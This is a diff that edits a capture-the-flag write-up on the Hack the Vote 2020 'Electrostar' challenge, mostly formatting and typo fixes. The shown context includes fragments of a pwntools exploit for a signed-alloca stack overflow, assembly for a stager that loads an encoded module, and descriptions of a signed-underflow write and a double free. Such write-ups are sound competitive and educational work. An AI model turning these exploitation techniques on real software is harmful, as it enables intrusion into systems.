@@ -10,16 +10,19 @@ During this past weekend PFS participated in [Hack the Vote 2020](https://hackth
 
 ## Challenge Overview
 
-Electrostar consisted of a main userspace host binary and a series of small module files. You receive the challenge with the userspace and 3 module files. There are also 3 placeholder flags - two text files and one executable. The first two part involve reading the two flag files, while the final part requires a full breakout and code execution in the context of the main machine binary. The entire challenge as-given is meant to run on Ubuntu 18.04 and a libc is also provided.
+Electrostar consisted of a main userspace host binary and a series of small module files. You receive the challenge with the userspace and 3 module files. There are also 3 placeholder flags - two text files and one executable. The first two parts involve reading the two flag files, while the final part requires a full breakout and code execution in the context of the main machine binary. The entire challenge as-given is meant to run on Ubuntu 18.04 and a libc is also provided.
 
 Thankfully, the challenge author [itszn](https://twitter.com/itszn13) also provided a few shell scripts to organize things. One called `connect.sh` connects you directly to the remote challenge with live flags, and another called `serve.sh` hosts a local instance of the challenge with socat.
 
 ```bash=
 #!/bin/bash
 
+# serve.sh
+
 chmod -r flag3.exe
 /usr/bin/socat -d -d TCP-LISTEN:9000,reuseaddr,fork EXEC:"timeout -sKILL 300 env 
-    ./machine modules/init_module.img.sig",pty,stderr,setsid,sigint,sighup,echo=0,sane,raw,ignbrk=1
+    ./machine modules/init_module.img.sig",pty,stderr,
+    setsid,sigint,sighup,echo=0,sane,raw,ignbrk=1
 ```
 
 ## Part 1
@@ -239,7 +242,7 @@ __int64 __fastcall process_ipc_data(char *data)
 
 Inside `ballot_module`'s `process_ipc_data` function, it performs a stack `alloca()` call based on the first byte of input, which it treats as a signed value. Since it's signed, this is another bug; we can blow out the expectation of where the stack data will be allocated by passing a value greater than 0x7f. Afterwards, our raw payload will be copied to the stack, giving us control of pc (modules have no stack canaries). Obtaining the flag is straightforward from here, since the module provides a `print_part1_flag` function we can jump to, but which is never otherwise called.
 
-```python=
+```python
 from pwn import *
 from pwnlib.util.proc import pid_by_name
 
@@ -260,7 +263,6 @@ p.recvuntil("Submit")
 
 print("here we go")
 print(hex(pemptr))
-
 
 p.send("\x0a")
 p.send("\x0a")
@@ -556,19 +558,7 @@ MoqoZXO1iBFOGg==
 
 Once we've leaked the key, we can patch it into our own local binary where it should go. The local binary provides a convenient command line option to sign payloads as desired. All that is left is to transmit our payload to the server. `socat` is unhappy with certain bytes (e.g. 0x03) which the challenge authors use as an EOF byte. The IPC mechanism itself for reading in data breaks on newlines. Therefore, I actually used a stager payload to receive my module file and un-encode those special bytes from it.
 
-```asm=
-nop
-
-mov r12, 0x0807060504030201
-
-; leak base
-mov rax, [0x502120]
-mov rax, [rax+0x28]
-sub rax, 0x206280
-add rax, 0x206000
-mov r14, rax
-add r14, 0x20
-
+```asm
 ; this value is patched to the number of encoded bytes
 mov rdi, 0x5555555555555555
 call read_bytes
@@ -632,39 +622,6 @@ mov rdi, 21
 mov rsi, r15
 mov rdx, 0x5656565656565656
 call ipc
-
-perma:
-jmp perma
-
-malloc:
-mov rax, 0x5002D8
-jmp rax
-
-ipc:
-mov rax, 0x500406
-jmp rax
-
-memcpy:
-mov rax, 0x5002E8
-jmp rax
-
-strlen:
-mov rax, 0x5002D0
-jmp rax
-
-mmap:
-mov rax, 0x9
-syscall
-ret
-
-madvise:
-mov rax, 0x1c
-syscall
-ret
-
-read_bytes:
-mov rax, 0x50056b
-jmp rax
 ```
 
 After this jerry-rigging, we obtain the flag for part 2!
@@ -675,7 +632,7 @@ After this jerry-rigging, we obtain the flag for part 2!
 
 I didn't actually solve part 3, but I found 3 interesting bugs which I assume are at least partially related to pwning the process. It should be noted that we don't need any leaks, since we have execution in a forked copy of the process and so can figure everything out ourselves (plus, it hands us a pointer to `dlsym` as an argument when it jumps to our code)
 
-1. The IPC handler for opcode 50 contains an obvious signed underflow bug. Not only is this method clearly intended to be abused, it's also convenient. The primitive allows us to write a fully controlled qword at any negative offset below the `record_array`, which is located in bss. Interesting targets there include `stdin/stdout/stderr FILE *` pointers, which we can leverage for FSOP on this version of libc.`
+- The IPC handler for opcode 50 contains an obvious signed underflow bug. Not only is this method clearly intended to be abused, it's also convenient. The primitive allows us to write a fully controlled qword at any negative offset below the `record_array`, which is located in bss. Interesting targets there include `stdin/stdout/stderr FILE *` pointers, which we can leverage for FSOP on this version of libc.
 
 ```c
 if ( opcode == 50 )
@@ -697,7 +654,7 @@ if ( opcode == 50 )
 }
 ```
 
-2. In opcode 2's handler, there are some lifetime issues around the module header chunk
+- In opcode 2's handler, there are some lifetime issues around the module header chunk
 
 ```c
 else if ( opcode == 2 )
@@ -757,7 +714,7 @@ void __fastcall check_gui_output(void *a1, size_t a2)
 
 `waiting_for_input` is never unset, and will be freed if the module exits. This means we can, at the very least, probably control which file descrpitor arbitrary data is written to as part of `waiting_for_input->pipe2write`
 
-3. Inside the module loading code, there is a `free(3)` of possibly uninitialized stack data. This occurs when a module is loaded that fails one of the checks _prior_ to signature validation. The chunk that is freed is supposed to be the calculated module hash. The easiest way to trigger this is to try to load a file whose first byte is >0x40. Most of the time, you will segfault by freeing garbage. However, by a special series of opcodes (opcode 10, followed by the bug trigger) I could get a free of an already-freed 0x20 heap chunk.
+- Inside the module loading code, there is a `free(3)` of possibly uninitialized stack data. This occurs when a module is loaded that fails one of the checks _prior_ to signature validation. The chunk that is freed is supposed to be the calculated module hash. The easiest way to trigger this is to try to load a file whose first byte is >0x40. Most of the time, you will segfault by freeing garbage. However, by a special series of opcodes (opcode 10, followed by the bug trigger) I could get a free of an already-freed 0x20 heap chunk.
 
 Unfortunately, I wasn't able to turn this around fast enough before the competition ended. The game plan was to spray chunks prior to the trigger to ensure our double freed chunk would be in the tcache, allowing for arbitrary chunk allocation easily. However, the act of spraying was causing sufficient churn on my stack as to break the primitive and I ran out of time.
 
